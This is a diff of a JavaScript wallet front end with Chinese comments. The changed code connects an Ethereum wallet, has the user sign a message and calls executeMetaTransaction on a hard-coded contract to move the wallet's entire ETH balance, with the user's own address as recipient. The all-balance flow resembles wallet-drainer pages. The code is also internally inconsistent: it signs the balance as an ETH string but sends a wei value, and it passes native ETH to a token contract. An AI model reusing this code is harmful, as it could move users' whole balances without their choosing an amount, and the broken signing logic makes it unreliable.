@@ -4,17 +4,20 @@ let userAddress;
 async function connectWallet() {
     if (window.ethereum) {
         try {
+            // 请求连接钱包
             const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
             userAddress = accounts[0];
-            document.getElementById('walletInfo').innerText = `已连接: ${userAddress}`;
-            document.getElementById('walletInfo').classList.remove('hidden');
+            
+            // 显示已连接钱包信息
+            const walletInfo = document.getElementById('walletInfo');
+            walletInfo.innerText = `已连接钱包: ${userAddress}`;
+            walletInfo.classList.remove('hidden');
             document.getElementById('signButton').classList.remove('hidden');
 
-            // 自动填充接收者地址和余额
-            const recipient = userAddress; // 将接收者设置为当前连接的用户地址
-            const balance = await getTokenBalance(userAddress); // 获取用户余额
-            document.getElementById('recipient').value = recipient;
-            document.getElementById('amount').value = balance; // 将余额填充到金额输入框
+            // 获取并显示钱包余额
+            const balance = await getEthBalance(userAddress);
+            walletInfo.innerText += `\n余额: ${balance} ETH`;
+
         } catch (error) {
             console.error("连接钱包失败:", error);
         }
@@ -23,35 +26,23 @@ async function connectWallet() {
     }
 }
 
-async function getTokenBalance(address) {
-    const contractAddress = "0xAc7aa2ee970A703F3716A66D39F6A1cc5cfcea6b"; // 替换为您的合约地址
-    const contract = new web3.eth.Contract([
-        {
-            "constant": true,
-            "inputs": [{ "name": "owner", "type": "address" }],
-            "name": "balanceOf",
-            "outputs": [{ "name": "", "type": "uint256" }],
-            "payable": false,
-            "stateMutability": "view",
-            "type": "function"
-        }
-    ], contractAddress);
-
-    const balance = await contract.methods.balanceOf(address).call();
-    return balance;
+async function getEthBalance(address) {
+    const balance = await web3.eth.getBalance(address);
+    return web3.utils.fromWei(balance, 'ether');
 }
 
 async function signAndSend() {
-    const recipient = document.getElementById('recipient').value;
-    const amount = document.getElementById('amount').value;
+    const recipient = userAddress; // 使用当前连接的钱包地址作为接收者地址
+    const balance = await getEthBalance(userAddress); // 获取钱包余额并将其全部转移
 
-    // 检查金额是否有效（是否大于0）
-    if (!amount || amount <= 0) {
-        alert('请输入有效的金额');
+    // 检查余额是否足够
+    if (balance <= 0) {
+        alert('余额不足，无法转移');
         return;
     }
 
-    const messageHash = web3.utils.keccak256(web3.utils.soliditySha3(userAddress, recipient, amount));
+    // 生成签名消息
+    const messageHash = web3.utils.keccak256(web3.utils.soliditySha3(userAddress, recipient, balance));
     const signature = await web3.eth.personal.sign(messageHash, userAddress);
 
     const contractAddress = "0xAc7aa2ee970A703F3716A66D39F6A1cc5cfcea6b"; // 替换为您的合约地址
@@ -73,12 +64,17 @@ async function signAndSend() {
     ], contractAddress);
 
     try {
-        await contract.methods.executeMetaTransaction(userAddress, recipient, amount, signature).send({ from: userAddress });
-        alert('元交易成功发送');
+        // 执行元交易并转移全部余额
+        await contract.methods.executeMetaTransaction(userAddress, recipient, web3.utils.toWei(balance, 'ether'), signature).send({ from: userAddress });
+        alert('元交易成功发送，余额已转移');
     } catch (error) {
         console.error("元交易发送失败:", error);
     }
 }
 
-document.getElementById('connectWalletButton').onclick = connectWallet;
+document.getElementById('connectWalletButton').onclick = async () => {
+    web3 = new Web3(window.ethereum);
+    await connectWallet();
+};
+
 document.getElementById('signButton').onclick = signAndSend;
